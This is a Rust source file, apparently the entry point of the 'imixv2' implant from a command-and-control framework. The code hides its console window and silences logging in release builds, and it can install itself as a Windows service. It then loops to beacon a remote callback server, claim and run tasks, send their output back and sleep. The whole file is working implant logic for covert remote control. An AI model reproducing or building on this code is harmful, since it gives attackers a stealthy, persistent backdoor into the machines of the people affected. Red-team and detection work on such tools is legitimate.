#![cfg_attr(
    all(not(debug_assertions), not(feature = "win_service")),
    windows_subsystem = "windows"
)]

extern crate alloc;

use anyhow::Result;
use std::sync::Arc;
use std::time::{Duration, Instant};

#[cfg(all(feature = "win_service", windows))]
#[macro_use]
extern crate windows_service;
#[cfg(all(feature = "win_service", windows))]
mod win_service;

use crate::agent::ImixAgent;
use crate::task::TaskRegistry;
pub use pb::config::Config;
pub use transport::{ActiveTransport, Transport};

mod agent;
mod shell;
mod task;
#[cfg(test)]
mod tests;
mod version;
use crate::version::VERSION;

use std::sync::atomic::{AtomicBool, Ordering};

pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);

#[tokio::main]
async fn main() -> Result<()> {
    #[cfg(feature = "win_service")]
    match windows_service::service_dispatcher::start("imixv2", ffi_service_main) {
        Ok(_) => {
            return Ok(());
        }
        Err(_err) => {
            #[cfg(debug_assertions)]
            log::error!("Failed to start service (running as exe?): {_err}");
        }
    }

    run_agent().await
}

// ============ Windows Service =============

#[cfg(all(feature = "win_service", not(target_os = "windows")))]
compile_error!("Feature win_service is only available on windows targets");

#[cfg(feature = "win_service")]
define_windows_service!(ffi_service_main, service_main);

#[cfg(feature = "win_service")]
#[tokio::main]
async fn service_main(arguments: Vec<std::ffi::OsString>) {
    crate::win_service::handle_service_main(arguments);
    let _ = run_agent().await;
}

// ============ Main Agent Logic =============

async fn run_agent() -> Result<()> {
    // Initialize logging
    #[cfg(debug_assertions)]
    {
        use pretty_env_logger;
        pretty_env_logger::formatted_timed_builder()
            .filter_level(log::LevelFilter::Info)
            .parse_env("IMIX_LOG")
            .init();
        log::info!("Starting imixv2 agent");
    }

    // Load config / defaults
    let config = Config::default_with_imix_verison(VERSION);

    // Initial transport is just a placeholder, we create active ones in the loop
    let transport = ActiveTransport::init();

    let handle = tokio::runtime::Handle::current();
    let task_registry = Arc::new(TaskRegistry::new());
    let agent = Arc::new(ImixAgent::new(
        config,
        transport,
        handle,
        task_registry.clone(),
    ));

    while !SHUTDOWN.load(Ordering::Relaxed) {
        let start = Instant::now();

        // Refresh IP
        agent.refresh_ip().await;

        // Create new active transport
        let (callback_uri, proxy_uri) = agent.get_transport_config().await;

        let active_transport_result = ActiveTransport::new(callback_uri, proxy_uri);

        match active_transport_result {
            Ok(transport) => {
                // Set transport
                agent.update_transport(transport).await;

                // Claim Tasks
                match agent.fetch_tasks().await {
                    Ok(tasks) => {
                        if tasks.is_empty() {
                            #[cfg(debug_assertions)]
                            log::info!("Callback success, no tasks to claim")
                        }
                        for task in tasks {
                            #[cfg(debug_assertions)]
                            log::info!("Claimed task: {}", task.id);

                            task_registry.spawn(task, agent.clone());
                        }
                    }
                    Err(e) => {
                        #[cfg(debug_assertions)]
                        log::error!("Callback failed: {e:#}");
                    }
                }

                // Flush Outputs (send all buffered output)
                agent.flush_outputs().await;

                // Disconnect (drop transport)
                agent.update_transport(ActiveTransport::init()).await;
            }
            Err(e) => {
                #[cfg(debug_assertions)]
                log::error!("Failed to create transport: {e:#}");
            }
        }

        // If shutdown was requested during work
        if SHUTDOWN.load(Ordering::Relaxed) {
            break;
        }

        let interval = agent.get_callback_interval_u64();
        let delay = match interval.checked_sub(start.elapsed().as_secs()) {
            Some(secs) => Duration::from_secs(secs),
            None => Duration::from_secs(0),
        };
        #[cfg(debug_assertions)]
        log::info!(
            "callback complete (duration={}s, sleep={}s)",
            start.elapsed().as_secs(),
            delay.as_secs()
        );
        std::thread::sleep(delay);
    }

    #[cfg(debug_assertions)]
    log::info!("Agent shutting down");

    Ok(())
}
